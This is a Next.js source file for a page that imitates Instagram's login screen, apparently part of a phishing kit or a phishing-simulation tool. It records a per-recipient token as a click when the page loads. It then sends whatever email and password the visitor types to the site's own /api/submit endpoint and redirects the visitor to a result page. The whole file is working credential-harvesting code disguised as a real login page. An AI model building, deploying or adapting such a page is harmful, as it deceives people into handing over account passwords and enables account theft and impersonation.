///app/account-review/instagram/page.tsx
"use client";

import { useRouter, useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSignUp, setIsSignUp] = useState(false);
  const sp = useSearchParams();
  const router = useRouter();
  const token = sp.get("token") ?? "";
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!token) return;

    fetch("/api/click", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token }),
    });
  }, [token]);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!token) return;

    try {
      setLoading(true);

      await fetch("/api/submit", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          token,
          submitted_email: email,
          submitted_password: password,
        }),
      });

      router.push("/result");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-4 py-8">
      <div className="w-full max-w-[350px] flex flex-col gap-3">
        {/* Login Card */}
        <div className="bg-[#1c1c1c] border border-[#363636] rounded-sm p-10 flex flex-col items-center">
          {/* Logo Placeholder */}

          <img
            src="/images/igg.png"
            alt="Logo"
            className="w-[200px] h-auto mb-8"
          />

          {/* Form */}
          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2">
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-[#121212] border border-[#363636] rounded-sm px-3 py-2.5 text-sm text-white placeholder-[#737373] focus:outline-none focus:border-[#555555] transition-colors"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-[#121212] border border-[#363636] rounded-sm px-3 py-2.5 text-sm text-white placeholder-[#737373] focus:outline-none focus:border-[#555555] transition-colors"
            />
           
            <button
              type="submit"
              disabled={loading || !token}
              className="w-full bg-[#0095f6] hover:bg-[#1aa1f7] text-white font-semibold py-2 rounded-lg mt-2 text-sm transition-colors "
            >
              {loading ? "Logging in..." : isSignUp ? "Sign up" : "Log in"}
            </button>
          </form>

          {/* OR Divider */}
          <div className="flex items-center w-full my-5">
            <div className="flex-1 h-px bg-[#363636]" />
            <span className="px-4 text-[#a8a8a8] text-sm font-semibold">
              OR
            </span>
            <div className="flex-1 h-px bg-[#363636]" />
          </div>

          {/* Facebook Login */}
          <button
            type="button"
            className="flex items-center gap-2 text-[#0095f6] font-semibold text-sm hover:text-white transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="currentColor"
              className="w-5 h-5"
            >
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Log in with Facebook
          </button>

          {/* Forgot Password */}
          <button
            type="button"
            className="mt-4 text-[#a8a8a8] text-xs hover:text-white transition-colors"
          >
            Forgot password?
          </button>
        </div>

        {/* Sign Up / Log In Card */}
        <div className="bg-[#1c1c1c] border border-[#363636] rounded-sm p-5 text-center">
          <span className="text-[#a8a8a8] text-sm">
            {isSignUp ? "Have an account? " : "Don't have an account? "}
            <button
              type="button"
              onClick={() => setIsSignUp(!isSignUp)}
              className="text-[#0095f6] font-semibold hover:text-white transition-colors"
            >
              {isSignUp ? "Log in" : "Sign up"}
            </button>
          </span>
        </div>

        {/* Get the App Section */}
        <div className="text-center mt-4">
          <p className="text-[#a8a8a8] text-sm mb-4">Get the app.</p>
          <div className="flex items-center justify-center gap-2">
            {/* App Store Badge */}
            <a href="#" className="inline-block">
              <div className="bg-black border border-white rounded-lg px-3 py-2 flex items-center gap-2 hover:bg-[#1c1c1c] transition-colors">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="white"
                  className="w-6 h-6"
                >
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
                </svg>
                <div className="text-left">
                  <div className="text-[10px] text-gray-300">
                    Download on the
                  </div>
                  <div className="text-sm font-semibold text-white">
                    App Store
                  </div>
                </div>
              </div>
            </a>

            {/* Google Play Badge */}
            <a href="#" className="inline-block">
              <div className="bg-black border border-white rounded-lg px-3 py-2 flex items-center gap-2 hover:bg-[#1c1c1c] transition-colors">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  className="w-6 h-6"
                >
                  <path
                    fill="#EA4335"
                    d="M3.609 1.814L13.792 12 3.61 22.186a2.372 2.372 0 0 1-.87-1.837V3.651c0-.723.33-1.37.869-1.837z"
                  />
                  <path
                    fill="#FBBC04"
                    d="M17.556 8.237L3.609 1.814A2.377 2.377 0 0 1 5.049 1.5c.397 0 .794.098 1.153.293l10.462 5.805.892.639z"
                  />
                  <path
                    fill="#34A853"
                    d="M3.609 22.186l13.947-7.762.892-.639-10.462-5.805a2.37 2.37 0 0 0-1.153-.293c-.54 0-1.043.182-1.44.314l-.784 13.185z"
                  />
                  <path
                    fill="#4285F4"
                    d="M21.13 12l-3.574-1.984-.892-.639L13.792 12l2.872 2.623.892-.639L21.13 12z"
                  />
                </svg>
                <div className="text-left">
                  <div className="text-[10px] text-gray-300">GET IT ON</div>
                  <div className="text-sm font-semibold text-white">
                    Google Play
                  </div>
                </div>
              </div>
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
